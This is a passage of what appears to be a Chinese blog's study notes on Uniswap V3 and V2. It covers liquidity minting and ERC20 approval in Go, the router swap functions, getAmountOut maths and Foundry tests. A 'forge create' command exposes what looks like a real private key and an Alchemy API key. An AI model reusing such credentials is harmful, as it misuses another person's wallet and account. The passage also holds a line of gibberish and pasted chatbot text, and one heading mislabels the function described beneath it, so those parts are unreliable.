<code>approve(spender, amount)</code> 方法，<code>spender</code> 是 NonfungiblePositionManager 合约地址，<code>amount</code> 是你想授权的最大代币数量。</p></li><li><p>官方合约的授权</p><ul><li><pre><code class="go">    client := ethereumcli.GetAbstract()    //usdt := &quot;0x43adb6c61b63bd44b91140d669f6156a619769f1&quot; // dai地址    usdt := &quot;0x9EDCde0257F2386Ce177C3a7FCdd97787F0D841d&quot; //weth地址    caller := NewERC20Caller(usdt, client)    //addr := &quot;0x069f199763c045A294C7913E64bA80E5F362A5d7&quot; //官方的NonfungiblePositionManager合约地址    addr := &quot;0x0f3482B9eEAC898C668195500c176AAa8627FE99&quot;                  //我们的的NonfungiblePositionManager合约地址    amountUsdt := new(big.Int).Mul(big.NewInt(1000000), big.NewInt(1e18)) // ni    caller.Approve(addr, amountUsdt)<figure class="highlight roboconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs roboconf"><br>  - <br><br>几dfjjhiladsjfjhiohkjsnishuishuiabasijhfnniahuosnmnishusfdnnisdsfhnosdafjhksdjhkjnishhkninsjhuwkjwh<br><br><span class="hljs-comment">## 增加流动性</span><br><br>增加流动性有点复杂<br><br>```go<br>func (n *NpManager) Mint(tokenA, tokenB string, AmountADesired, AmountBDesired *big.Int) &#123;<br>// 根据地址大小确定 <span class="hljs-attribute">token0 和 token1</span><br><span class="hljs-attribute">token0</span> := tokenA<br>token1 := tokenB<br>amount0Desired := AmountADesired<br>amount1Desired := AmountBDesired<br><br>if strings<span class="hljs-variable">.ToLower</span>(tokenA) &gt; strings<span class="hljs-variable">.ToLower</span>(tokenB) &#123;<br>token0 = tokenB<br>token1 = tokenA<br>amount0Desired = AmountBDesired<br>amount1Desired = AmountADesired<br>&#125;<br>/// 获取当前价格<br>slot0, err := n<span class="hljs-variable">.pool</span><span class="hljs-variable">.Slot</span>0(nil)<br>if err != nil &#123;<br>log<span class="hljs-variable">.Fatalf</span>(&quot;获取池子当前状态失败: %v&quot;, err)<br>&#125;<br>// 如果 sqrtPriceX96 为 0，说明池子未初始化<br>// 如果 sqrtPriceX96 为 0，说明池子未初始化<br>if slot0<span class="hljs-variable">.SqrtPriceX</span>96<span class="hljs-variable">.Cmp</span>(big<span class="hljs-variable">.NewInt</span>(0)) == 0 &#123;<br>// 需要先初始化池子<br>log<span class="hljs-variable">.Println</span>(&quot;池子未初始化，需要先设置初始价格&quot;)<br><br>// 使用 SetString 来处理大数<br>base, _ := new(big<span class="hljs-variable">.Int</span>)<span class="hljs-variable">.SetString</span>(&quot;79228162514264337593543950336&quot;, 10)<br>weth9 := &quot;0x9EDCde0257F2386Ce177C3a7FCdd97787F0D841d&quot;<br><br>var sqrtPriceX96 *big<span class="hljs-variable">.Int</span><br>if strings<span class="hljs-variable">.ToLower</span>(token0) == strings<span class="hljs-variable">.ToLower</span>(weth9) &#123;<br>// token0 是 WETH，价格是 DAI/WETH = 100<br>// sqrt(100) = 10<br>sqrtPriceX96 = new(big<span class="hljs-variable">.Int</span>)<span class="hljs-variable">.Mul</span>(big<span class="hljs-variable">.NewInt</span>(10), base)<br>&#125; else &#123;<br>// token0 是 DAI，价格是 WETH/DAI = 0.01<br>// sqrt(0.01) = 0.1<br>sqrtPriceX96 = new(big<span class="hljs-variable">.Int</span>)<span class="hljs-variable">.Div</span>(base, big<span class="hljs-variable">.NewInt</span>(10))<br>&#125;<br><br>// 初始化池子<br>tx, err := n<span class="hljs-variable">.pool</span><span class="hljs-variable">.Initialize</span>(n<span class="hljs-variable">.auth</span>, sqrtPriceX96)<br>if err != nil &#123;<br>log<span class="hljs-variable">.Fatalf</span>(&quot;初始化池子失败: %v&quot;, err)<br>&#125;<br><br>_, err = bind<span class="hljs-variable">.WaitMined</span>(context<span class="hljs-variable">.Background</span>(), n<span class="hljs-variable">.client</span>, tx)<br>if err != nil &#123;<br>log<span class="hljs-variable">.Fatalf</span>(&quot;等待初始化交易确认失败: %v&quot;, err)<br>&#125;<br><br>log<span class="hljs-variable">.Println</span>(&quot;池子初始化成功，价格设置为 1 WETH = 100 DAI&quot;)<br>&#125;<br><br>// slot0<span class="hljs-variable">.Tick</span> 是 int24 类型<br>//currentTick := int64(slot0<span class="hljs-variable">.Tick</span>)<br>currentTick := slot0<span class="hljs-variable">.Tick</span><span class="hljs-variable">.Int</span>64()<br>currentPrice := math<span class="hljs-variable">.Pow</span>(1.0001, float64(currentTick))<br><br>fmt<span class="hljs-variable">.Printf</span>(&quot;当前 Tick: %d, 当前价格: %f\n&quot;, currentTick, currentPrice)<br><br>// 计算 tick 范围，以当前价格为中心<br>tickSpacing := int64(60)<br>tickLowerInt := ((currentTick / tickSpacing) - 10) * tickSpacing<br>tickUpperInt := ((currentTick / tickSpacing) + 10) * tickSpacing<br><br>// 转换为 *big<span class="hljs-variable">.Int</span> 类型<br>tickLower := big<span class="hljs-variable">.NewInt</span>(tickLowerInt)<br>tickUpper := big<span class="hljs-variable">.NewInt</span>(tickUpperInt)<br><br>fmt<span class="hljs-variable">.Printf</span>(&quot;计算的 tickLower: %s, tickUpper: %s\n&quot;, tickLower<span class="hljs-variable">.String</span>(), tickUpper<span class="hljs-variable">.String</span>())<br><br>params := nonfungiblepositionmanager<span class="hljs-variable">.INonfungiblePositionManagerMintParams</span>&#123;<br>Token0:         common<span class="hljs-variable">.HexToAddress</span>(token0),<br>Token1:         common<span class="hljs-variable">.HexToAddress</span>(token1),<br>Fee:            big<span class="hljs-variable">.NewInt</span>(3000),<br>TickLower:      tickLower,<br>TickUpper:      tickUpper,<br>Amount0Desired: amount0Desired,<br>Amount1Desired: amount1Desired,<br>Amount0Min:     big<span class="hljs-variable">.NewInt</span>(0),<br>Amount1Min:     big<span class="hljs-variable">.NewInt</span>(0),<br>Recipient:      n<span class="hljs-variable">.auth</span><span class="hljs-variable">.From</span>,<br>Deadline:       big<span class="hljs-variable">.NewInt</span>(time<span class="hljs-variable">.Now</span>()<span class="hljs-variable">.Add</span>(10 * time<span class="hljs-variable">.Minute</span>)<span class="hljs-variable">.Unix</span>()),<br>&#125;<br><br>tx, err := n<span class="hljs-variable">.positionManager</span><span class="hljs-variable">.Mint</span>(n<span class="hljs-variable">.auth</span>, params)<br>if err != nil &#123;<br>log<span class="hljs-variable">.Fatalf</span>(&quot;npm Mint err: %v&quot;, err)<br>&#125;<br><br>fmt<span class="hljs-variable">.Printf</span>(&quot;npm Mint tx sent: https://sepolia<span class="hljs-variable">.abscan</span><span class="hljs-variable">.org</span>/tx/%s\n&quot;, tx<span class="hljs-variable">.Hash</span>()<span class="hljs-variable">.Hex</span>())<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li></ul></li></ul><h2 id="做swap"><a href="#做swap" class="headerlink" title="做swap ,"></a>做swap ,</h2><ul><li>官方路由： 0xb9D4347d129a83cBC40499Cd4fF223dE172a70dF</li><li>我的路由：0x4541dd7207afa33ab6530bbb9129c525800d4f6e</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">forge create src/Counter.sol:Counter  --rpc-url https://abstract-testnet.g.alchemy.com/v2/wqZxT7UnY6AgrzV42CtGgGQ7ZGM-UrTq --private-key 0x90e796e58b90f17c442c5956d2f6876a8b37a7cf428996138e816c6edda3f5b2 --broadcast<br></code></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">U<span class="hljs-symbol">niswapV3</span>PoolSwapTest<br></code></pre></td></tr></table></figure><h2 id="自己的weth"><a href="#自己的weth" class="headerlink" title="自己的weth"></a>自己的weth</h2><p>Pool0 千3费率池：0xFD296ED86e68393B8FE9Fba5668B3858A58EA8ae</p><p>Pool0 百1费率池：0xe03f483122ABE1F835b13CaEd13C4c86aEd0fE52 已做交易</p><p>自己的WETH Uniswap官方版本</p><p>Pool0 千3费率池：0xAAb35867946a6ce783c465D9f61bD57De449954f</p><p>Pool0 百1费率池：0x3D33f313e441DcD3c53C7eeD92E13215D9E82E45 </p><p>套利合约：0x47738fDa993956f0FCE229c81Ed950b1B1612cc2</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>08-7Solidity笔记之七UniswapV2</title>
    <link href="/2025/06/12/08-7Solidity%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%83/"/>
    <url>/2025/06/12/08-7Solidity%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%83/</url>
    
    <content type="html"><![CDATA[<h1 id="Uniswap"><a href="#Uniswap" class="headerlink" title="Uniswap"></a>Uniswap</h1><h1 id="UniswapV2Router02-sol路由合约"><a href="#UniswapV2Router02-sol路由合约" class="headerlink" title="UniswapV2Router02.sol路由合约"></a>UniswapV2Router02.sol路由合约</h1><h2 id="swapTokensForExactTokens函数"><a href="#swapTokensForExactTokens函数" class="headerlink" title="swapTokensForExactTokens函数"></a>swapTokensForExactTokens函数</h2><p>用户指定输入代币的精确数量，路由合约帮你按当前汇率和滑点计算能换到的最少输出代币数量，并完成兑换。</p><h2 id="函数签名"><a href="#函数签名" class="headerlink" title="函数签名"></a>函数签名</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function swapExactTokensForTokens(<br>    uint amountIn,             // 输入代币数量（精确）<br>    uint amountOutMin,         // 最少接受的输出代币数量（防止滑点过大）<br>    address[] calldata path,   // 兑换路径（代币地址数组）<br>    address to,                // 兑换后代币接收地址<br>    uint deadline              // 交易截止时间（区块时间戳）<br>) external returns (uint[] memory amounts);<br></code></pre></td></tr></table></figure><hr><h2 id="主要流程"><a href="#主要流程" class="headerlink" title="主要流程"></a>主要流程</h2><ol><li><strong>转入输入代币</strong><ul><li>用户先通过 ERC20 <code>approve</code> 授权路由合约使用输入代币。</li><li>路由合约调用 <code>transferFrom</code> 从用户地址转入 <code>amountIn</code> 输入代币到第一个交易对合约。</li></ul></li><li><strong>计算兑换路径中每一步的输出数量</strong><ul><li>使用 <code>UniswapV2Library.getAmountsOut</code> 计算整个路径上每一步的输出金额。</li><li>这个函数基于当前池子储备量和手续费计算每一步的输出。</li></ul></li><li><strong>检查输出数量是否满足用户要求</strong><ul><li>确保最终输出代币数量 &gt;&#x3D; <code>amountOutMin</code>，防止滑点过大。</li></ul></li><li><strong>执行多步兑换</strong><ul><li>路由合约调用每个交易对合约的 <code>swap</code> 方法，依次完成路径中所有交易对的兑换。</li><li>最终输出代币发送到 <code>to</code> 地址。</li></ul></li><li><strong>返回每一步的代币数量数组</strong><ul><li>返回 <code>amounts</code>，包含路径上每个代币的数量（输入和输出）。</li></ul></li></ol><hr><h2 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h2><ul><li>用户输入数量固定，输出数量根据池子状态动态计算。</li><li>通过 <code>amountOutMin</code> 保护用户免受价格波动影响。</li><li>支持多跳兑换（路径长度 &gt; 2）。</li></ul><hr><h1 id="2-swapTokensForExactTokens"><a href="#2-swapTokensForExactTokens" class="headerlink" title="2. swapTokensForExactTokens"></a>2. <code>swapTokensForExactTokens</code></h1><h2 id="函数作用"><a href="#函数作用" class="headerlink" title="函数作用"></a>函数作用</h2><p>用户指定想要获得的输出代币数量，路由合约帮你计算完成兑换所需的最少输入代币数量，并完成兑换。</p><hr><h2 id="函数签名-1"><a href="#函数签名-1" class="headerlink" title="函数签名"></a>函数签名</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function swapTokensForExactTokens(<br>    uint amountOut,            // 输出代币数量（精确）<br>    uint amountInMax,          // 允许的最大输入代币数量（防止滑点过大）<br>    address[] calldata path,   // 兑换路径<br>    address to,                // 接收地址<br>    uint deadline              // 截止时间<br>) external returns (uint[] memory amounts);<br></code></pre></td></tr></table></figure><hr><h2 id="主要流程-1"><a href="#主要流程-1" class="headerlink" title="主要流程"></a>主要流程</h2><ol><li><strong>计算兑换路径中每一步的输入数量</strong><ul><li>使用 <code>UniswapV2Library.getAmountsIn</code> 计算整个路径上每一步所需的输入金额。</li><li>这个函数基于当前池子储备量和手续费计算输入数量。</li></ul></li><li><strong>检查输入数量是否满足用户要求</strong><ul><li>确保最终输入代币数量 &lt;&#x3D; <code>amountInMax</code>，防止滑点导致输入过多。</li></ul></li><li><strong>转入输入代币</strong><ul><li>路由合约调用 <code>transferFrom</code> 从用户地址转入计算好的输入代币数量到第一个交易对合约。</li></ul></li><li><strong>执行多步兑换</strong><ul><li>路由合约调用每个交易对合约的 <code>swap</code> 方法，依次完成路径中所有交易对的兑换。</li><li>最终输出代币发送到 <code>to</code> 地址。</li></ul></li><li><strong>返回每一步的代币数量数组</strong><ul><li>返回 <code>amounts</code>，包含路径上每个代币的数量（输入和输出）。</li></ul></li></ol><hr><h2 id="关键点-1"><a href="#关键点-1" class="headerlink" title="关键点"></a>关键点</h2><ul><li>用户输出数量固定，输入数量根据池子状态动态计算。</li><li>通过 <code>amountInMax</code> 保护用户免受价格波动影响。</li><li>支持多跳兑换。</li></ul><hr><h1 id="总结对比"><a href="#总结对比" class="headerlink" title="总结对比"></a>总结对比</h1><table><thead><tr><th>函数名</th><th>输入固定还是输出固定</th><th>用户保护参数</th><th>计算方法</th><th>适用场景</th></tr></thead><tbody><tr><td><code>swapExactTokensForTokens</code></td><td>输入数量固定</td><td><code>amountOutMin</code></td><td><code>getAmountsOut</code></td><td>用户知道自己要卖多少代币，想获得尽可能多的输出</td></tr><tr><td><code>swapTokensForExactTokens</code></td><td>输出数量固定</td><td><code>amountInMax</code></td><td><code>getAmountsIn</code></td><td>用户知道自己想买多少代币，愿意最多花多少钱</td></tr></tbody></table><hr><p>如果你需要，我可以帮你写这两个函数的伪代码流程，或者帮你分析它们的源码细节。需要告诉我！</p><p>好的，关于这两个函数的返回值，我来详细说明一下。</p><hr><h1 id="swapExactTokensForTokens-和-swapTokensForExactTokens-的返回值"><a href="#swapExactTokensForTokens-和-swapTokensForExactTokens-的返回值" class="headerlink" title="swapExactTokensForTokens 和 swapTokensForExactTokens 的返回值"></a><code>swapExactTokensForTokens</code> 和 <code>swapTokensForExactTokens</code> 的返回值</h1><p>这两个函数的返回值都是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint[] memory amounts<br></code></pre></td></tr></table></figure><hr><h2 id="返回值-amounts-是什么？"><a href="#返回值-amounts-是什么？" class="headerlink" title="返回值 amounts 是什么？"></a>返回值 <code>amounts</code> 是什么？</h2><ul><li><code>amounts</code> 是一个数组，包含了兑换路径（<code>path</code>）中每个代币的数量。</li><li>数组长度等于 <code>path.length</code>。</li><li>具体来说：<ul><li><code>amounts[0]</code> 是输入代币的数量（<code>swapExactTokensForTokens</code> 中就是用户输入的 <code>amountIn</code>，<code>swapTokensForExactTokens</code> 中是计算出的实际输入数量）。</li><li><code>amounts[i]</code> 是路径中第 <code>i</code> 个代币的数量，中间经过每个交易对的兑换后递减或递增。</li><li><code>amounts[path.length - 1]</code> 是最终输出代币的数量。</li></ul></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这两个方法都会进行真正的swap操作，只是通过限制输入和输出的金额两种方式来调用而已</p><h2 id="一些函数功能讲解"><a href="#一些函数功能讲解" class="headerlink" title="一些函数功能讲解"></a>一些函数功能讲解</h2><h3 id="获取预期输入和输出金额"><a href="#获取预期输入和输出金额" class="headerlink" title="获取预期输入和输出金额"></a>获取预期输入和输出金额</h3><p>getAmountsIn、getAmountsOut、getAmountOut、getAmountIn</p><p>这几个方法都是一样的道理，都是获取对应的输入输出金额而已</p><ul><li><p>getAmountOut：给定一项资产的输入量和对储量，返回另一项资产的最大输出量</p><ul><li>amountIn：用户输入的代币数量（想要兑换的数量）</li><li>reserveIn：输入代币在池子中的储备量</li><li>reserveOut：输出代币在池子中的储备量</li></ul></li><li><p>getAmountIn：给定一项资产的输出量和对储备，返回另一项资产所需的输入量</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs solidity">amountIn：用户输入的代币数量（想要兑换的数量）<br>reserveIn：输入代币在池子中的储备量<br>reserveOut：输出代币在池子中的储备量<br>// 这样就很清晰了<br><br>function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) &#123;<br>        require(amountIn &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT&#x27;);<br>        require(reserveIn &gt; 0 &amp;&amp; reserveOut &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_LIQUIDITY&#x27;);<br>        // NOTE:<br>        // x = token in<br>        // y = token out<br>        //       dx * 0.997 * x0<br>        // dy = -----------------<br>        //       x0 + dx * 0.997<br><br>        // NOTE:<br>        // dx * 997<br>        uint amountInWithFee = amountIn.mul(997);<br>        // dx * 997 * y0<br>        uint numerator = amountInWithFee.mul(reserveOut);<br>        // x0 * 1000 + dx * 997<br>        uint denominator = reserveIn.mul(1000).add(amountInWithFee);<br>        //          dx * 997 * y0<br>        // dy = ----------------------<br>        //       x0 * 1000 + dx * 997<br>        // <br>        //        dx * 997 / 1000 * y0<br>        //    = -----------------------<br>        //        x0 + dx * 997 / 1000<br>        amountOut = numerator / denominator;<br>    &#125;<br></code></pre></td></tr></table></figure><p>然后再就是批量的</p><h2 id="像他一样发起这个测试来获得输入输出金额"><a href="#像他一样发起这个测试来获得输入输出金额" class="headerlink" title="像他一样发起这个测试来获得输入输出金额"></a>像他一样发起这个测试来获得输入输出金额</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// swap 测试，测试每次换币换来的金额<br>contract UniswapV2SwapAmountsTest is Test &#123;<br>    IWETH private constant weth = IWETH(WETH);<br>    IERC20 private constant dai = IERC20(DAI);<br>    IERC20 private constant mkr = IERC20(MKR);<br>    // 这里是实例化了一个02 的路由对象 router<br>    IUniswapV2Router02 private constant router =<br>        IUniswapV2Router02(UNISWAP_V2_ROUTER_02);<br><br>    function test_getAmountsOut() public &#123;<br>        address[] memory path = new address[](3);<br>        path[0] = WETH;<br>        path[1] = DAI;<br>        path[2] = MKR;<br><br>        uint256 amountIn = 1e18;<br>        // getAmountsOut 指定输入金额，获取输出金额<br><br>        uint256[] memory amounts = router.getAmountsOut(amountIn, path);<br><br>        console2.log(&quot;WETH&quot;, amounts[0]);<br>        console2.log(&quot;DAI&quot;, amounts[1]);<br>        console2.log(&quot;MKR&quot;, amounts[2]);<br>    &#125;<br><br>    function test_getAmountsIn() public &#123;<br>        address[] memory path = new address[](3);<br>        path[0] = WETH;<br>        path[1] = DAI;<br>        path[2] = MKR;<br><br>        uint256 amountOut = 1e16;<br>        // getAmountsIn 指定输出金额获取输入金额？<br>        // 调用的还是  UniswapV2Library.getAmountsIn(factory, amountOut, path);<br>        // 看到底层有一句注释<br>        // performs chained getAmountIn calculations on any number of pairs<br>        // 对任意数量的对执行链式 getAmountIn 计算所谓链式就是循环嘛--那就去看看 getAmountIn<br>        // given an output amount of an asset and pair reserves, returns a required input amount of the other asset<br>        // getAmountIn 给定一项资产的输出量和对储备，返回另一项资产所需的输入量<br>        // 这些都是路由合约的用法，路由合约是工具<br>        uint256[] memory amounts = router.getAmountsIn(amountOut, path);<br><br>        console2.log(&quot;WETH&quot;, amounts[0]);<br>        console2.log(&quot;DAI&quot;, amounts[1]);<br>        console2.log(&quot;MKR&quot;, amounts[2]);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="找合约"><a href="#找合约" class="headerlink" title="找合约"></a>找合约</h3><p><a href="https://sepolia.abscan.org/address/0x96ff7D9dbf52FdcAe79157d3b249282c7FABd409#code">https://sepolia.abscan.org/address/0x96ff7D9dbf52FdcAe79157d3b249282c7FABd409#code</a></p><p>找到测试网上的UniswapV2Router02路由合约</p><p>然后找到他的abi</p><p>然后根据abi生成go文件</p><p>然后调用对应的方法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs go"><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetAmount</span><span class="hljs-params">()</span></span> &#123;<br>client := ethereumcli.GetEthClient()<br>contractAddress := common.HexToAddress(<span class="hljs-string">&quot;0x96ff7D9dbf52FdcAe79157d3b249282c7FABd409&quot;</span>)<br>rounterInstance, err := uniswapv2router02.NewUniswapv2router02(contractAddress, client)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;Failed to instantiate contract: %v&quot;</span>, err)<br>&#125;<br><br>testAmountIn := big.NewInt(<span class="hljs-number">1000000000000</span>)<br>testAmountOut := big.NewInt(<span class="hljs-number">1000000000000</span>)<br>reserveIn := big.NewInt(<span class="hljs-number">10000000000000000</span>)<br>reserveOut := big.NewInt(<span class="hljs-number">300000000000000000</span>)<br><br>amountIn, err := rounterInstance.GetAmountIn(&amp;bind.CallOpts&#123;&#125;, testAmountIn, reserveIn, reserveOut)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;GetAmountIn err : %v&quot;</span>, err)<br>&#125;<br>log.Printf(<span class="hljs-string">&quot;amountint=%d&quot;</span>, amountIn)<br>amountOut, err := rounterInstance.GetAmountOut(&amp;bind.CallOpts&#123;&#125;, testAmountOut, reserveIn, reserveOut)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;GetAmountOut err : %v&quot;</span>, err)<br>&#125;<br>log.Printf(<span class="hljs-string">&quot;amountOut=%d&quot;</span>, amountOut)<br><br><span class="hljs-comment">// 指定对应的代币合约去多跳</span><br>USDC := common.HexToAddress(<span class="hljs-string">&quot;0xe4C7fBB0a626ed208021ccabA6Be1566905E2dFc&quot;</span>)<br>WETH := common.HexToAddress(<span class="hljs-string">&quot;0x9EDCde0257F2386Ce177C3a7FCdd97787F0D841d&quot;</span>)<br>BTC := common.HexToAddress(<span class="hljs-string">&quot;0x216683565fbE6F3d365Ae5D73BE1549216989ff6&quot;</span>)<br><br><span class="hljs-comment">// 例如：USDC -&gt; WETH</span><br><span class="hljs-comment">//path := []common.Address&#123;USDC, WETH&#125;</span><br><br><span class="hljs-comment">// 或者：USDC -&gt; WETH -&gt; BTC</span><br>path := []common.Address&#123;USDC, WETH, BTC&#125;<br>amountsIn, err := rounterInstance.GetAmountsIn(&amp;bind.CallOpts&#123;&#125;, testAmountIn, path)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;GetAmountsIn err : %v&quot;</span>, err)<br>&#125;<br>log.Printf(<span class="hljs-string">&quot;amountsIn USDC =%d&quot;</span>, amountsIn[<span class="hljs-number">0</span>])<br>log.Printf(<span class="hljs-string">&quot;amountsIn WETH =%d&quot;</span>, amountsIn[<span class="hljs-number">1</span>])<br>log.Printf(<span class="hljs-string">&quot;amountsIn BTC =%d&quot;</span>, amountsIn[<span class="hljs-number">2</span>])<br>amountsOut, err := rounterInstance.GetAmountsOut(&amp;bind.CallOpts&#123;&#125;, testAmountIn, path)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;amountsOut err : %v&quot;</span>, err)<br>&#125;<br>log.Printf(<span class="hljs-string">&quot;amountsOut USDC =%d&quot;</span>, amountsOut[<span class="hljs-number">0</span>])<br>log.Printf(<span class="hljs-string">&quot;amountsOut WETH =%d&quot;</span>, amountsOut[<span class="hljs-number">1</span>])<br>log.Printf(<span class="hljs-string">&quot;amountsOut BTC =%d&quot;</span>, amountsOut[<span class="hljs-number">2</span>])<br>&#125;<br><br><br>=== RUN   TestGetAmount<br><span class="hljs-number">2025</span>/<span class="hljs-number">06</span>/<span class="hljs-number">12</span> <span class="hljs-number">21</span>:<span 